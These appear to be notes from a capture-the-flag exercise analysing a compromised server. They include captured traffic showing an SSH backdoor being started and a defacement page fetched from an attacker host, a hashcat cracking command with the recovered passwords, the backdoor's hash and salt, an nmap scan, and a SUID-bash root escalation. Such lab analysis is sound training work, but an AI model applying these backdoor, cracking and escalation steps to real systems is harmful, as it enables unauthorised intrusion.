%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
%<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
_<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"><soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To><wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Resolve</wsa:Action><wsa:MessageID>urn:uuid:80138158-054f-4d1d-902d-c52c31261c46</wsa:MessageID></soap:Header><soap:Body><wsd:Resolve><wsa:EndpointReference><wsa:Address>urn:uuid:00000000-0000-1000-8000-d8492faa17b6</wsa:Address></wsa:EndpointReference></wsd:Resolve></soap:Body></soap:Envelope>
xGenerating public/private rsa key pair.
zEnter file in which to save the key (/home/james/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ 
)chmod +x backdoor
uchmod +x backdoor
ujames@overpass-production:~/ssh-backdoor$ 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SkSSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
SSH-2.0-OpenSSH_8.2p1 Debian-4
SSH-2.0-OpenSSH_8.2p1 Debian-4
qcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1
Uaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
Uaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96
Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96
curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-c
rsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,sk-ecdsa-sha2-nistp256-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com,ssh-ed25519,sk-ssh-ed25519@openssh.com
lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com
lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com
umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1
umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1
none,zlib@openssh.com,zlib
none,zlib@openssh.com,zlib
SSH-2.0-OpenSSH_8.2p1 Debian-4
sSSH-2.0-OpenSSH_8.2p1 Debian-4
qcurve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1
Uaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
Uaes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr
Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96
Bhmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96
curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-c
ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,sk-ecdsa-sha2-nistp256-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,rsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com,ssh-ed25519,sk-ssh-ed25519@openssh.com,rsa-sha2-512,rsa-sha2-256,ssh-rsa
lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com
lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com
umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1
umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1
none,zlib@openssh.com,zlib
none,zlib@openssh.com,zlib
	GET /cooctus.png HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:40 GMT
Content-type: image/png
Content-Length: 60102
Last-Modified: Tue, 21 Jul 2020 19:33:27 GMT
yiCCPICC Profile
fGET /index.html HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:46 GMT
Content-type: text/html
Content-Length: 815
Last-Modified: Tue, 21 Jul 2020 19:33:39 GMT
    <title>LOL Hacked</title>
            font-family: 'Courier New', Courier, monospace;
            background: black;
            color: limegreen;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
            position: fixed;
            left: 50%;
            bottom: 0px;
            transform: translate(-50%, -0%);
            margin: 0 auto;
            max-width: 100vw;
            max-height: 100vh;
            margin: auto;
        <h1>H4ck3d by CooctusClan</h1>
        <p>Secure your servers!</p>
    <div><img src="cooctus.png"></div>
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "97f-5aae9add6c459-gzip"
JHTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:22 GMT
ETag: "32f-5aaf99ab26dad-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 385
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
GET /cooctus.png HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/
Connection: keep-alive
SHTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:31 GMT
ETag: "eac6-5aaf99b361586"
Accept-Ranges: bytes
Content-Length: 60102
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/png
yiCCPICC Profile
Counters provided by dumpcap


'''

Cracked Hash

'''
hashcat -m 1800 -a 0 -o crackedHash.txt target.txt dictionary.txt

$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3 ---------> Paradox
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123 -----------> szymex

What's the default hash for the backdoor?
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

What's the hardcoded salt for the backdoor?
1c362db832f3f864c8c2fe05f2002a05



Analyzing '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed'
[+] SHA-512 [Hashcat Mode: 1700]
[+] Whirlpool [Hashcat Mode: 6100]
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 
[+] Skein-512 
[+] Skein-1024(512) 


Crack the hash using rockyou and a cracking tool of your choice. What's the password?
november16

'''
Getting back into the system

Nmap Scan
'''

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 12:40 IST
Nmap scan report for 10.10.74.218
Host is up (0.42s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/12%OT=22%CT=1%CU=35476%PV=Y%DS=4%DC=T%G=Y%TM=5FFD4BA
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   277.65 ms 10.2.0.1
2   ... 3
4   413.29 ms 10.10.74.218



'''

'''

Ssh into system with from the backdoor of james user, then captured the user flag and found out .SUID_BASH file which gave me root access but -p flag is 
neccesary. 

'''